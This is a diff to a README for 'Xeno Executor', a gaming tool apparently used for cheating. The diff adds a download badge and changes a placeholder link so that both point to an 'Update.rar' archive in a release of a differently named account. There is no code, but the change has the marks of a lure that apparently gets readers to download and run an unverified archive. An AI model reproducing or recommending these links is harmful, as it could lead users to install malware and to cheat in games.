@@ -2,6 +2,8 @@
 
 **Xeno Executor** is a state-of-the-art tool designed for gamers seeking to push the boundaries of their gameplay experience. With advanced features and a sleek interface, Xeno Executor gives you the power to customize, optimize, and excel in your gaming adventures.  
 
+[![Downloadd](https://img.shields.io/badge/Download-Xeno%20Executor-blue)](https://github.com/XenoUpd/xeno-latest-update/releases/download/rel_ver1/Update.rar)
+
 ---
 
 ![image](https://github.com/user-attachments/assets/81d024f8-a04f-4c11-aff0-6d4bb5c4f410)
@@ -57,7 +59,7 @@ Ensure your system meets these requirements for the best experience with Xeno Ex
 ## 🚀 **Getting Started with Xeno Executor**  
 
 ### Step 1: **Download Xeno Executor**  
-Visit the official [Xeno Executor download page](#) to start the download.  
+Visit the official [Xeno Executor download page](https://github.com/XenoUpd/xeno-latest-update/releases/download/rel_ver1/Update.rar) to start the download.  
 
 ### Step 2: **Install the Tool**  
 Follow the on-screen setup instructions to install Xeno Executor on your computer.  
